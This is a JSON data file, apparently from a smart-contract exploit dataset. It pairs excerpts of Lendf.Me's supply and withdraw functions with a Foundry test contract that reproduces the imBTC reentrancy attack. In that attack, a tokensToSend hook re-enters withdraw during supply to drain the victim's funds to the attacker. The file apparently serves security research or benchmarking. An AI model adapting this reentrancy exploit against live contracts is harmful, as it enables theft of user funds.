[
  {
    "contract/interface": "IMoneyMarket",
    "source_type": "victim_contract",
    "function_name": "supply",
    "original_code": "    function supply(address asset, uint amount) public returns (uint) {\n        if (paused) {\n            return fail(Error.CONTRACT_PAUSED, FailureInfo.SUPPLY_CONTRACT_PAUSED);\n        }\n\n        Market storage market = markets[asset];\n        Balance storage balance = supplyBalances[msg.sender][asset];\n\n        SupplyLocalVars memory localResults; // Holds all our uint calculation results\n",
    "description": ""
  },
  {
    "contract/interface": "IMoneyMarket",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(address asset, uint requestedAmount) public returns (uint) {\n        if (paused) {\n            return fail(Error.CONTRACT_PAUSED, FailureInfo.WITHDRAW_CONTRACT_PAUSED);\n        }\n\n        Market storage market = markets[asset];\n        Balance storage supplyBalance = supplyBalances[msg.sender][asset];\n\n        WithdrawLocalVars memory localResults; // Holds all our calculation results\n",
    "description": ""
  },
  {
    "contract/interface": "LendfMeExploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LendfMeExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LendfMeExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LendfMeExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LendfMeExploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "LendfMeExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 9_899_725);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LendfMeExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LendfMeExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LendfMeExploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LendfMeExploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "LendfMeExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LendfMeExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LendfMeExploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_uint(\"[Before Attack]Victim imBTC Balance : \", (imBTC.balanceOf(victim)));\n        emit log_named_uint(\"[Before Attack]Attacker imBTC Balance : \", (imBTC.balanceOf(attacker)));\n\n        // prepare\n        imBTC.approve(victim, type(uint256).max);\n        erc1820.setInterfaceImplementer(address(this), TOKENS_SENDER_INTERFACE_HASH, address(this));\n\n        // move\n        cheats.startPrank(attacker);\n        imBTC.transfer(address(this), imBTC.balanceOf(attacker));\n        cheats.stopPrank();\n\n        // attack\n        uint256 this_balance = imBTC.balanceOf(address(this));\n        uint256 victim_balance = imBTC.balanceOf(victim);\n        if (this_balance > (victim_balance + 1)) {\n            this_balance = victim_balance + 1;\n        }\n        IMoneyMarket(victim).supply(address(imBTC), this_balance - 1);\n        IMoneyMarket(victim).supply(address(imBTC), 1);\n        IMoneyMarket(victim).withdraw(address(imBTC), type(uint256).max);\n\n        // transfer benefit back to the attacker\n        IERC20(imBTC).transfer(attacker, IERC20(imBTC).balanceOf(address(this)));\n\n        emit log_string(\"--------------------------------------------------------------\");\n        emit log_named_uint(\"[After Attack]Victim imBTC Balance : \", (imBTC.balanceOf(victim)));\n        emit log_named_uint(\"[After Attack]Attacker imBTC Balance : \", (imBTC.balanceOf(attacker)));\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "LendfMeExploit",
    "source_type": "attacker_contract",
    "function_name": "tokensToSend",
    "original_code": "    function tokensToSend(\n        address, // operator\n        address, // from\n        address, // to\n        uint256 amount,\n        bytes calldata, // userData\n        bytes calldata // operatorData\n    ) external {\n        if (amount == 1) {\n            IMoneyMarket(victim).withdraw(address(imBTC), type(uint256).max);\n        }\n",
    "description": ""
  }
]